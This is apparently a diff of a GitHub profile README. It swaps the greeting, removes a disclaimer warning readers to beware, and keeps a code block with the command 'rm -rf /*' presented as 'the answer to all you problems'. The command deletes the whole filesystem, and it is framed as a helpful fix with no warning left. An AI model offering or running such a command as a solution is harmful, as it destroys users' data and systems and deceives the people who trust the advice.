@@ -1,12 +1,9 @@
-### Welcome 👋
+### Hi There 👋
 
-You want answers? Well here it is.. 
+here is the answer to all you problems
 ```
 rm -rf /* 
 ```
-
-
-*** disclaimer *** need it be said to beware?
 
 <!--
 **PIesPnuema/PIesPnuema** is a ✨ _special_ ✨ repository because its `README.md` (this file) appears on your GitHub profile.
